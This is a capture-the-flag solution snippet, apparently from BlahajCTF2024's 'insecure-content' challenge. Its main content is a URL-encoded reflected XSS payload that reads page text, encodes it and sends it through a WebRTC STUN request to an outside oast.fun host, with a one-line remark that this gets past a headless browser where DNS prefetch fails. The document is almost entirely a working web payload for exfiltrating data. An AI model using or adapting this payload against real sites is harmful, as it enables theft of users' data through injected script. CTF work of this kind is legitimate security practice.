```
http://127.0.0.1:8000/greet?name=%3Cscript%3Ewindow.addEventListener%28%22load%22%2C+%28%29+%3D%3E+%7B+let+data+%3D+btoa%28document.querySelector%28%22p%22%29.innerText.substring%2848%29%29%3B+let+newdata+%3D+data.split%28%22%22%29.map%28%28c%29+%3D%3E+%7B+++++if+%28%21isNaN%28c%29%29+%7Breturn+c%3B%7D+++++else+if+%28c+%3D%3D+c.toUpperCase%28%29%29+%7Breturn+c.toLowerCase%28%29+%2B+c.toLowerCase%28%29%3B%7D+++++else+%7Breturn+c%3B%7D+%7D%29%3B+let+ex+%3D+newdata.join%28%22%22%29.replaceAll%28%22%3D%22%2C%22%22%29%3B+console.log%28ex%29%3B+let+e+%3D+new+RTCPeerConnection%28%7B+iceServers%3A+%5B%7B+urls%3A+%5B%22stun%3A%22%2Bex%2B%22.zrekefudcwgdnisxolob95nwy11uq3ho7.oast.fun%22%5D+%7D%5D+%7D%29%3B+e.createDataChannel%28%22%22%29%3B+e.createOffer%28%29.then%28r+%3D%3E+e.setLocalDescription%28r%29%29+%7D%29%3B%3C%2Fscript%3E
```

TLDR its a webrtc exfiltration (DNS prefetch dont work since its headless, and puppeteer is headless)

full writeup: https://rwandi-ctf.github.io/BlahajCTF2024/insecure-content/
